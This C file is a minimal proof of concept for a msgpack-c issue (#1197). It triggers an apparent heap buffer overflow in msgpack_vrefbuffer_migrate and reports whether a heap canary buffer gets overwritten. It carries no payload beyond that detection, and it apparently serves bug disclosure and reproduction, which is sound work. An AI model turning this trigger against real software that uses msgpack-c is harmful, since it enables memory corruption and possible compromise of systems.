/* Upstream msgpack/msgpack-c#1197 minimal PoC (plain glibc malloc). */
#define _GNU_SOURCE
#include <msgpack/vrefbuffer.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>

static const char PAYLOAD[16] = "XXXXXXXXXXXXXXX";
#define CANARY_SIZE 256

int main(void) {
    msgpack_vrefbuffer vbuf, to;
    int i;
    setbuf(stdout, NULL);
    msgpack_vrefbuffer_init(&vbuf, 0, 0);
    msgpack_vrefbuffer_init(&to, 0, 0);

    for (i = 0; i < 20; i++) msgpack_vrefbuffer_append_ref(&vbuf, PAYLOAD, 8);
    for (i = 0; i < 5; i++)  msgpack_vrefbuffer_append_ref(&to, PAYLOAD, 8);
    msgpack_vrefbuffer_clear(&to);

    unsigned char *heap_canary = (unsigned char*)malloc(CANARY_SIZE);
    memset(heap_canary, 0xAA, CANARY_SIZE);

    printf("Before migrate: vbuf nused=%zu to usable=%zu bytes_to_copy=%zu\n",
           (size_t)(vbuf.tail - vbuf.array),
           malloc_usable_size(to.array),
           sizeof(msgpack_iovec)*(size_t)(vbuf.tail - vbuf.array));
    int rc = msgpack_vrefbuffer_migrate(&vbuf, &to);
    printf("migrate() returned %d\n", rc);

    int corrupted = 0;
    int first = -1;
    for (i = 0; i < CANARY_SIZE; i++) if (heap_canary[i] != 0xAA) { corrupted = 1; first = i; break; }
    printf("canary sentinel: %s (first changed byte=%d)\n",
           corrupted ? "CORRUPTED" : "intact", first);

    free(heap_canary);
    msgpack_vrefbuffer_destroy(&vbuf);
    msgpack_vrefbuffer_destroy(&to);
    return corrupted ? 1 : 0;
}
